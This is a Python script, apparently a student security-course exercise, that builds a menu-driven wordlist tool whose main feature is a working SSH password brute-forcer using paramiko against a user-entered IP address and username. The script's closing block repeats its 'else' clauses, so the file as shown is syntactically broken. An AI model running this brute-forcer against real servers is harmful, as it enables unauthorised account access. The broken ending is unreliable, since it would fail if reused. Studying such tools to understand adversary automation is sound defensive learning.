# Script Name:					Ops-challenge-17.py
# Author: 					    Juan Maldonado
# Date of latest revision:		1/30/2024
# Purpose:					    This is a custom tool that more code was added to perform even more brute force attacks to better unsetstand
#                       the types of automation employed by adversaries. 


import time

# I used the following websit as resources: https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
#                                           https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/
#                                           https://docs.paramiko.org/en/latest/api/client.html?highlight=ssh%20set_missing_host_key_policy%20paramiko%20autoaddpolicy
import paramiko

# This function is for Mode 1: Offensive; Dictionary Iterator
def iteration():
    # This prompts the user to input the word list file path
    filepath = input("Enter your word list file path:\n")

    try:
        # This opens the specified word list file with ISO-8859-1 encoding to handle potential encoding issues
        with open(filepath, encoding="ISO-8859-1") as file:
            # This iterates through each line (word) in the file
            for line in file:
                word = line.strip()  # This removes the leading and trailing whitespaces from the word
                print("Current Word:", word)  # This prints the current word to the screen
                time.sleep(1)  # This adds a delay of 1 second between words to simulate iteration
    except FileNotFoundError:
        print(f"File not found at: {filepath}")  # This prints an error message if the file is not found
    except Exception as e:
        print(f"An error occurred: {e}")  # This prints a generic error message if an exception occurs

# This function is for Mode 2: Defensive; Password Recognized
def password_checker():
    # This prompts the user to input the string to search for and the word list file path
    user_string = input("Please enter the string to search for:\n")
    filepath = input("Please enter your word list file path:\n")

    try:
        # This opens the specified word list file with ISO-8859-1 
        with open(filepath, encoding="ISO-8859-1") as file:
            # This creates a list of words from the file using list comprehension
            word_list = [line.strip() for line in file]

        # This checks if the user input string is in the word list
        if user_string in word_list:
            print(f"This string '{user_string}' appeared in the word list.")
        else:
            print(f"The string '{user_string}' did not appear in the word list.")
    except FileNotFoundError:
        print(f"File not found at: {filepath}")  # This prints an error message if the file is not found
    except Exception as e:
        print(f"An error occurred: {e}")  # This prints a generic error message if an exception occurs

# This function is for Mode 3: SSH Brute Force
def ssh_bruteforce(ip_address, username, wordlist_path):
    try:
        # This opens the specified word list file
        with open(wordlist_path, encoding="ISO-8859-1") as file:
            # This iterates through each line (password) in the file
            for line in file:
                password = line.strip()
                print(f"Trying password: {password}")

                # This attempts a SSH connection
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                try:
                    # This trys to connect to the SSH server with the current username and password
                    ssh.connect(ip_address, username=username, password=password, timeout=5)
                    print(f"Successful login! Username: {username}, Password: {password}")
                    return True
                except paramiko.AuthenticationException:
                    print("Authentication failed.")
                except Exception as e:
                    print(f"An error occurred: {e}")
                finally:
                    # Close the SSH connection
                    ssh.close()

                time.sleep(1)  # This delays between attempts

        print("Password not found in the word list.")
        return False

    except FileNotFoundError:
        print(f"File not found at path: {wordlist_path}")
        return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

# Main block
if __name__ == "__main__":
    while True:
        # Display the menu to the user and prompt for input
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive; Dictionary Iterator
2 - Defensive; Password Recognized
3 - SSH Brute Force
4 - Exit
    Please enter a number: 
""")

        if mode == "1":
            iteration()  # This calls the function for Mode 1
        elif mode == "2":
            password_checker()  # This calls the function for Mode 2
        elif mode == '3':
            # This prompts the user for input in Mode 3
            ip_address = input("Enter the target SSH server IP address:\n")
            username = input("Enter the SSH username:\n")
            wordlist_path = input("Enter the word list file path:\n")
            ssh_bruteforce(ip_address, username, wordlist_path)  # This calls the ssh_bruteforce function for Mode 3
        elif mode == '4':
            break  # Exit the script for Mode 4
        else:
            print("Invalid selection...")  # This displays an error message for invalid input

            break  # This exits the script for Mode 4
        else:
            print("Invalid selection...")  # This displays an error message for invalid input
